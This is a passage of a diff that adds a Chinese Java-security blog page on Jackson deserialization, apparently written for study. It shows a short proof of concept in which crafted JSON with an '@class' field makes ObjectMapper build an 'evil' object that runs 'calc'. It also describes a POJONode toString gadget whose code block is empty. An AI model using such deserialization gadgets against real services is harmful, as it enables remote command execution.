+</span></span><span class="line"><span class="cl">                &#34;, name=&#39;&#34; + name + &#39;\&#39;&#39; +
+</span></span><span class="line"><span class="cl">                &#34;, object=&#34; + object +
+</span></span><span class="line"><span class="cl">                &#39;}&#39;;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">EvilPerson evilPerson = new EvilPerson();
+</span></span><span class="line"><span class="cl">    evilPerson.age = 1;
+</span></span><span class="line"><span class="cl">    evilPerson.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">    evilPerson.object = new evil();
+</span></span><span class="line"><span class="cl">    ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//        String json = mapper.writeValueAsString(evilPerson);
+</span></span><span class="line"><span class="cl">//        System.out.println(json);
+</span></span><span class="line"><span class="cl">    String json = &#34;{\&#34;age\&#34;:1,\&#34;name\&#34;:\&#34;ygsr\&#34;,\&#34;object\&#34;:{\&#34;@class\&#34;:\&#34;evil\&#34;,\&#34;cmd\&#34;:\&#34;calc\&#34;}}&#34;;
+</span></span><span class="line"><span class="cl">    EvilPerson person1 = mapper.readValue(json,EvilPerson.class);
+</span></span><span class="line"><span class="cl">    System.out.println(person1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524920456-a7e4be58-6db5-4ed5-8a75-8c27691dc3b7.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h1 id="通杀">通杀
+</h1><p><font style="color:rgb(51, 51, 51);">利用的是Jackson中的PojoNode 他的toString是可以直接触发任意的getter的 触发条件如下</font></p>
+<ul>
+<li><font style="color:rgb(51, 51, 51);">不需要存在该属性</font></li>
+<li><font style="color:rgb(51, 51, 51);">getter方法需要有返回值</font></li>
+<li><font style="color:rgb(51, 51, 51);">尽可能的只有一个getter</font></li>
+</ul>
+<p>很像fastjson漏洞</p>
+<p>代码实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Feb 19, 2025 07:24 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/log4j2/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/log4j2/0.72bd8f65320ba2a09e0c36508e7caa12_hu9956bd2b8819a55b37ccb90c62b2f008_204896_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Log4j2漏洞原理"
+                        
+                        data-hash="md5-cr2PZTILoqCeDDZQjnyqEg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Log4j2漏洞原理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26.cef2fe99533407212681f8679c82e2e5_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson各版本绕过分析"
+                        
+                        data-hash="md5-zvL&#43;mVM0ByEmgfhnnILi5Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson各版本绕过分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/25.090c9fb095cfbe1b9147302afa798b94_hueda339f65764f7844afcc8ab1b48c07c_207061_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson1.2.62-1.2.68版本反序列化漏洞"
+                        
+                        data-hash="md5-CQyfsJXPvhuRRzAq&#43;nmLlA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson1.2.62-1.2.68版本反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/24.536555907a9796a67203136e7846373a_huf13ef49576a26e60058adb4232b89236_327164_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson-1.2.24版本漏洞分析"
+                        
+                        data-hash="md5-U2VVkHqXlqZyAxNueEY3Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson-1.2.24版本漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/23.18927b89b7cec8d6042141c403d831a0_huf9676a8800dc8cf9723afb54e95056be_155376_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java动态代理"
+                        
+                        data-hash="md5-GJJ7ibfOyNYEIUHEA9gxoA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java动态代理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+  body {
+    background: url(https://gsygsr.github.io/background/58.jpg) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+    </body>
+</html>
